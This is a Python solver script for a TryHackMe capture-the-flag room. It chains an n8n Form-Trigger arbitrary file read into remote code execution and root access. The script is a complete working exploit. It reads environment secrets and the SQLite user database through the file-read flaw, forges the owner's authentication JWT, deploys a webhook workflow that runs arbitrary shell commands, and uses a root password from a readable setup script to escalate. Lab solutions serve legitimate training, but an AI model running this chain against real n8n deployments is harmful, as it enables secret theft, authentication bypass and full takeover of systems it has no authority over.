#!/usr/bin/env python3
"""
Nightmare  —  TryHackMe "Cypheron"  (Task 3, Insane)
End-to-end solver for CVE-2026-21858 "Ni8mare": unauthenticated arbitrary file
read in an n8n Form-Trigger workflow, chained to full RCE and container-root.

Chain:
  1. Unauth arbitrary file read via JSON `files{}.filepath` on POST /form/<path>
  2. Loot /proc/self/environ (JWT secret + enc key), ~/.n8n/config, database.sqlite
  3. Forge the n8n `n8n-auth` JWT for the owner  (hash = b64(sha256(email:pw))[:10])
  4. Owner REST API -> create + activate a webhook workflow whose executeCommand
     node runs attacker-supplied commands  =>  RCE as the n8n user (uid 1000)
  5. Privesc: /setup.sh is world-readable and contains the root password ->
     `su root` -> read the root flag from the bind-mounted host FS (/host-root)

Usage:
  python3 solve.py <base_url> <form_path>
  e.g. python3 solve.py http://TARGET:5678 file-processor

Nothing is hardcoded to the specific box: every secret/flag is recovered live.
Requires: python3 (stdlib only) + a local `sqlite3` CLI for DB parsing.
"""
import sys, os, json, time, random, string, hashlib, hmac, base64, subprocess, tempfile
import urllib.request, urllib.error

def rs(n=8): return ''.join(random.choice(string.ascii_lowercase) for _ in range(n))
def b64u(b): return base64.urlsafe_b64encode(b).rstrip(b'=')

class N8n:
    def __init__(self, base, form_path):
        self.base = base.rstrip('/')
        self.form = f"{self.base}/form/{form_path}"
        self.token = None

    def _req(self, url, data=None, method="GET", headers=None):
        h = {"Content-Type": "application/json"}
        if headers: h.update(headers)
        if self.token: h.setdefault("Cookie", f"n8n-auth={self.token}")
        req = urllib.request.Request(url, data=data, method=method, headers=h)
        try:
            with urllib.request.urlopen(req, timeout=30) as r:
                return r.status, r.read()
        except urllib.error.HTTPError as e:
            return e.code, e.read()

    # ---- 1. CVE-2026-21858 arbitrary file read ---------------------------------
    def read_file(self, path):
        r = rs(6)
        payload = {"data": {}, "files": {f"f-{r}": {
            "filepath": path, "originalFilename": f"{rs(8)}.bin",
            "mimetype": "application/octet-stream",
            "size": random.randint(10000, 99999)}}}
        code, body = self._req(self.form, json.dumps(payload).encode(), "POST")
        return body if code == 200 else None

    # ---- 3. forge the owner auth JWT -------------------------------------------
    @staticmethod
    def jwt_hash(email, password):
        return base64.b64encode(
            hashlib.sha256(f"{email}:{password}".encode()).digest()).decode()[:10]

    def forge_jwt(self, secret, uid, email, password):
        now = int(time.time())
        payload = {"id": uid, "hash": self.jwt_hash(email, password),
                   "iat": now, "exp": now + 7 * 86400}
        seg = lambda o: b64u(json.dumps(o, separators=(',', ':')).encode())
        head = seg({"alg": "HS256", "typ": "JWT"}); body = seg(payload)
        sig = b64u(hmac.new(secret.encode(), head + b'.' + body, hashlib.sha256).digest())
        self.token = (head + b'.' + body + b'.' + sig).decode()
        code, _ = self._req(f"{self.base}/rest/login")
        return code == 200

    # ---- 4. REST -> webhook RCE workflow ---------------------------------------
    def deploy_rce(self):
        path = f"diag-{rs(6)}"
        wf = {"name": f"z-{rs(4)}", "active": False,
              "settings": {"executionOrder": "v1"},
              "nodes": [
                {"parameters": {"httpMethod": "POST", "path": path,
                                "responseMode": "lastNode", "options": {}},
                 "id": "11111111-1111-1111-1111-111111111111", "name": "Hook",
                 "type": "n8n-nodes-base.webhook", "typeVersion": 2,
                 "position": [0, 0], "webhookId": f"wh-{rs(6)}"},
                {"parameters": {"command": "={{ $json.body.cmd }}"},
                 "id": "22222222-2222-2222-2222-222222222222", "name": "Run",
                 "type": "n8n-nodes-base.executeCommand", "typeVersion": 1,
                 "position": [300, 0]}],
              "connections": {"Hook": {"main": [[{"node": "Run", "type": "main", "index": 0}]]}}}
        code, body = self._req(f"{self.base}/rest/workflows",
                               json.dumps(wf).encode(), "POST")
        wid = json.loads(body)["data"]["id"]
        self._req(f"{self.base}/rest/workflows/{wid}",
                  json.dumps({"active": True}).encode(), "PATCH")
        time.sleep(1)
        self.wid, self.rce_path = wid, path
        return path

    def run(self, cmd):
        code, body = self._req(f"{self.base}/webhook/{self.rce_path}",
                               json.dumps({"cmd": cmd}).encode(), "POST")
        try:
            return json.loads(body).get("stdout", body.decode('latin1'))
        except Exception:
            return body.decode('latin1')

    def cleanup(self):
        # archive + delete our workflow so the box is left as found
        self._req(f"{self.base}/rest/workflows/{self.wid}",
                  json.dumps({"active": False}).encode(), "PATCH")
        self._req(f"{self.base}/rest/workflows/{self.wid}",
                  json.dumps({"isArchived": True}).encode(), "PATCH")
        self._req(f"{self.base}/rest/workflows/{self.wid}", None, "DELETE")


def main():
    if len(sys.argv) < 3:
        sys.exit("usage: solve.py <base_url> <form_path>   e.g. solve.py http://TARGET:5678 file-processor")
    n = N8n(sys.argv[1], sys.argv[2])

    print("[*] 1) verifying arbitrary file read (CVE-2026-21858) ...")
    host = n.read_file("/etc/hostname")
    assert host, "file read failed — is this the vulnerable form path?"
    print(f"    /etc/hostname -> {host.decode(errors='replace').strip()}")

    print("[*] 2) looting secrets via LFI ...")
    environ = n.read_file("/proc/self/environ").replace(b'\x00', b'\n').decode()
    env = dict(l.split('=', 1) for l in environ.splitlines() if '=' in l)
    jwt_secret = env["N8N_USER_MANAGEMENT_JWT_SECRET"]
    home = env.get("HOME", "/home/node")
    print(f"    JWT secret = {jwt_secret!r}   HOME = {home}")

    db = n.read_file(f"{home}/.n8n/database.sqlite")
    assert db and db[:6] == b"SQLite", "could not read database.sqlite"
    tmp = tempfile.NamedTemporaryFile(suffix=".sqlite", delete=False)
    tmp.write(db); tmp.close()
    row = subprocess.check_output(
        ["sqlite3", tmp.name,
         "SELECT id||'|'||email||'|'||password FROM user LIMIT 1;"]).decode().strip()
    uid, email, pw = row.split('|', 2)
    os.unlink(tmp.name)
    print(f"    owner = {email}  (id {uid})")

    print("[*] 3) forging owner JWT ...")
    assert n.forge_jwt(jwt_secret, uid, email, pw), "JWT forge rejected"
    print("    /rest/login OK — authenticated as owner")

    print("[*] 4) deploying webhook RCE workflow ...")
    n.deploy_rce()
    print("    id =", n.run("id").strip())

    print("[*] 5) user flag (LFI-readable) ...")
    uf = n.run("cat " + home + "/flag-user-lfi.txt 2>/dev/null || true").strip()
    print("    USER FLAG:", uf)

    print("[*] 6) privesc -> container root ...")
    setup = n.run("cat /setup.sh 2>/dev/null || true")
    import re
    m = re.search(r"echo\s+'root:([^']+)'\s*\|\s*chpasswd", setup)
    root_pw = m.group(1) if m else None
    print(f"    root password recovered from world-readable /setup.sh: {'yes' if root_pw else 'NO'}")
    if root_pw:
        rf = n.run(f"echo '{root_pw}' | su root -c 'cat /host-root/flag.txt' 2>&1 | tail -1 || true").strip()
        print("    ROOT FLAG:", rf)

    print("[*] 7) cleanup ...")
    n.cleanup()
    print("    removed our workflow — target left as found.")


if __name__ == "__main__":
    main()
